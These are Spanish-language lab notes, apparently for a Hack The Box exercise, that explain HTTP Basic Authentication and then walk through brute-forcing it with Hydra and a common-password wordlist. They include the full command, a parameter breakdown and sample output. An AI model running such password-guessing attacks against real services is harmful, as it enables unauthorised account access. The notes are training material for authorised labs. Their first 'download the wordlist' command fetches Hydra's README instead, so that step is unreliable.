
## 1. ¿Qué es HTTP Basic Authentication?

**HTTP Basic Authentication (Basic Auth)** es un mecanismo de autenticación HTTP que protege recursos solicitando un nombre de usuario y una contraseña.

Cuando un usuario intenta acceder a un recurso protegido, el servidor puede responder con:

```
HTTP/1.1 401 Unauthorized
WWW-Authenticate: Basic realm="Protected Area"
```

- `401 Unauthorized`: indica que la petición no contiene credenciales válidas para acceder al recurso protegido.
    
- `WWW-Authenticate`: indica el mecanismo de autenticación que debe utilizar el cliente.
    
- `Basic`: identifica el esquema de autenticación HTTP Basic.
    

### ¿Cómo funciona?

1. El usuario intenta acceder a un recurso protegido.
    
2. El servidor solicita autenticación mediante `WWW-Authenticate`.
    
3. El navegador combina el usuario y la contraseña en una cadena con el formato `usuario:contraseña`.
    
4. La cadena se codifica mediante **Base64**.
    
5. El navegador envía las credenciales codificadas en la cabecera `Authorization`.
    
6. El servidor verifica las credenciales y concede o deniega el acceso.
    

### Ejemplo de petición HTTP

```
GET /protected_resource HTTP/1.1
Host: www.example.com
Authorization: Basic YWxpY2U6c2VjcmV0MTIz
```

La cabecera:

```
Authorization: Basic YWxpY2U6c2VjcmV0MTIz
```

contiene las credenciales codificadas en Base64.

**Importante:** Base64 es una codificación, no un cifrado. Por sí sola, no protege las credenciales frente a quien pueda interceptar la comunicación. Por eso, Basic Auth debe utilizarse sobre HTTPS.

## 2. Atacar HTTP Basic Authentication con Hydra

En el laboratorio de HTB se conocen los siguientes datos:

- **Usuario:** `basic-auth-user`
    
- **Servicio:** HTTP Basic Authentication
    
- **Ruta:** `/`
    
- **Puerto:** `81`
    
- **Wordlist:** `2023-200_most_used_passwords.txt`
    

Como el nombre de usuario ya se conoce, solamente es necesario probar diferentes contraseñas.

### Paso 1. Descargar la wordlist

```
curl -s -O https://raw.githubusercontent.com/vanhauser-thc/thc-hydra/master/README.md
```

Para utilizar exactamente la lista indicada en el ejercicio de HTB, descarga su archivo de SecLists:

```
curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/56a39ab9a70a89b56d66dad8bdffb887fba1260e/Passwords/2023-200_most_used_passwords.txt
```

El archivo contiene una lista de contraseñas comunes que Hydra utilizará para los intentos de autenticación.

### Paso 2. Ejecutar Hydra

```
hydra -l basic-auth-user -P 2023-200_most_used_passwords.txt 127.0.0.1 http-get / -s 81
```

**Ejecuta este comando contra la instancia de laboratorio que tengas autorizada.** Si HTB te proporciona una IP diferente de `127.0.0.1`, sustituye la dirección por la correspondiente a tu objetivo.

### Desglose del comando

|Parámetro|Función|
|---|---|
|`-l basic-auth-user`|Especifica el nombre de usuario conocido.|
|`-P 2023-200_most_used_passwords.txt`|Carga el archivo de contraseñas candidatas.|
|`127.0.0.1`|Indica la dirección IP del objetivo.|
|`http-get`|Selecciona el módulo de autenticación HTTP GET.|
|`/`|Especifica la ruta que se va a consultar.|
|`-s 81`|Establece el puerto del servicio en `81`.|

Hydra prueba las contraseñas de la lista contra el recurso protegido e informa cuando encuentra unas credenciales válidas.

### Ejemplo de salida

```
[DATA] attacking http-get://127.0.0.1:81/
[81][http-get] host: 127.0.0.1 login: basic-auth-user password: ...
1 of 1 target successfully completed, 1 valid password found
```

La contraseña aparece en el resultado real de Hydra cuando se encuentra una coincidencia válida.

## 3. Conceptos importantes

### `-l` frente a `-L`

```
-l usuario
```

Especifica un único nombre de usuario.

```
-L usernames.txt
```

Carga una lista de nombres de usuario.

### `-p` frente a `-P`

```
-p contraseña
```

Especifica una única contraseña.

```
-P passwords.txt
```

Carga una lista de contraseñas.

### `http-get`

Selecciona el módulo de Hydra que realiza peticiones HTTP GET con el mecanismo de autenticación correspondiente.

En este ejercicio se utiliza porque el objetivo protege el recurso mediante **HTTP Basic Authentication**, no mediante un formulario web convencional.

### `-s`

Permite indicar un puerto diferente del habitual:

```
-s 81
```

Es útil cuando el servicio HTTP escucha en un puerto no estándar.

## 4. Basic Auth frente a un formulario de inicio de sesión

|Característica|HTTP Basic Authentication|Formulario web|
|---|---|---|
|Mecanismo|Autenticación HTTP mediante cabeceras.|Envío de credenciales mediante un formulario.|
|Cabecera característica|`Authorization: Basic ...`|Depende de la aplicación y de la petición.|
|Respuesta de autenticación|Puede utilizar `401 Unauthorized` y `WWW-Authenticate`.|Depende de la lógica de la aplicación.|
|Módulo de Hydra del ejercicio|`http-get`|`http-post-form`, cuando corresponde.|
|Información necesaria|Usuario, wordlist, objetivo, puerto y ruta.|Usuario, wordlist, ruta, campos del formulario y condición de éxito o fallo.|

**No confundas ambos mecanismos:** antes de utilizar Hydra, identifica cómo autentica el servidor.

## 5. Resumen para el examen CPTS/OSCP

- **HTTP Basic Authentication:** mecanismo de autenticación HTTP basado en usuario y contraseña.
    
- `**401 Unauthorized**`**:** respuesta habitual cuando se necesitan credenciales válidas.
    
- `**WWW-Authenticate**`**:** cabecera que anuncia el mecanismo de autenticación requerido.
    
- `**Authorization**`**:** cabecera que transporta las credenciales codificadas.
    
- **Base64:** codificación utilizada para representar la cadena `usuario:contraseña`; no es cifrado.
    
- `**hydra -l**`**:** especifica un usuario.
    
- `**hydra -P**`**:** carga una wordlist de contraseñas.
    
- `**http-get**`**:** módulo utilizado en el laboratorio para probar HTTP Basic Authentication.
    
- `**-s 81**`**:** selecciona el puerto 81.
    
- `**/**`**:** indica la ruta del recurso protegido.
    
- **HTTPS:** protege la comunicación mediante cifrado de transporte y es importante al utilizar Basic Auth.
    

### Comando clave del laboratorio

```
hydra -l basic-auth-user -P 2023-200_most_used_passwords.txt 127.0.0.1 http-get / -s 81
```

> **Idea fundamental:** cuando conoces el usuario y el objetivo utiliza HTTP Basic Authentication, puedes emplear Hydra con `http-get`, una wordlist de contraseñas y el puerto correcto para comprobar las credenciales en un laboratorio autorizado.
